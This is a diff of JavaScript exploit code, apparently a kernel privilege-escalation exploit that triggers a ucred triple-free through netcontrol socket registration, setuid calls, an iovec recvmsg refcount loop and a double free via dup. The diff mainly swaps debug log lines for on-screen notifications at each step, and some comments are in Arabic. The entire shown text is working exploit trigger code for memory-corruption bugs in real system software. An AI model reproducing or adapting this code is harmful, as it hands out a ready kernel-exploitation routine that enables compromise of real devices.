@@ -1432,47 +1432,56 @@ function trigger_ucred_triplefree() {
     //log("[TRIGGER] loop start main_count=" + main_count);
 
     // 1) dummy socket → register in netcontrol
-    //log("[TRIGGER] step 1: create dummy_socket & register in netcontrol");
+    sendNotification("step 1: create dummy_socket & register in netcontrol - start");
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    var sock_buf = malloc(8); write32(sock_buf, dummy_socket)
-    //log("[TRIGGER] dummy_socket=" + dummy_socket.toString(16));
+    var sock_buf = malloc(8);
+    write32(sock_buf, dummy_socket);
     netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, sock_buf, 8);
     close(dummy_socket);
+    sendNotification("step 1: done");
+
     // 2) allocate new ucred
-    //log("[TRIGGER] step 2: setuid(1) (alloc new ucred)");
+    sendNotification("step 2: setuid(1) (alloc new ucred) - start");
     setuid(1);
+    sendNotification("step 2: done");
 
     // 3) reclaim fd → uaf_socket
-    //log("[TRIGGER] step 3: reclaim fd → uaf_socket");
+    sendNotification("step 3: reclaim fd → uaf_socket - start");
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    sendNotification("step 3: done");
+
     // 4) free previous ucred
-    //log("[TRIGGER] step 4: setuid(1) (free previous ucred)");
+    sendNotification("step 4: setuid(1) (free previous ucred) - start");
     setuid(1);
+    sendNotification("step 4: done");
 
     // 5) unregister → free file + ucred
-    var ctrl_buf = malloc(8); write32(ctrl_buf, uaf_socket)
+    sendNotification("step 5: unregister → free file + ucred - start");
+    var ctrl_buf = malloc(8);
+    write32(ctrl_buf, uaf_socket);
     netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, ctrl_buf, 8);
-    //log("[TRIGGER] step 5 done");
+    sendNotification("step 5: done");
 
     // 6) محاولة إصلاح refcount بشكل خفيف
-    //log("[TRIGGER] step 6: refcount fix loop start, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS);
+    sendNotification("step 6: refcount fix loop start, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS);
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-     // log("[TRIGGER]   fix_loop i=" + i);
+      sendNotification("step 6: loop i=" + i + " - before trigger_iov_recvmsg");
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
+      sendNotification("step 6: loop i=" + i + " - after write, before wait_iov_recvmsg");
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
+      sendNotification("step 6: loop i=" + i + " - after read");
     }
-    log("[TRIGGER] step 6 done");
+    sendNotification("step 6: done");
 
     // 7) double free أول مرة
-    log("[TRIGGER] step 7: first double-free via dup(uaf_socket)");
-    
+    sendNotification("step 7: first double-free via dup(uaf_socket) - start");
     var dup_fd = dup(uaf_socket);
     if (dup_fd > -1) {
         close(dup_fd);
     }
-    log("[TRIGGER] step 7 done");
+    sendNotification("step 7: done");
 
     // 8) إيجاد التوأم
     log("[TRIGGER] step 8: find_twins()");
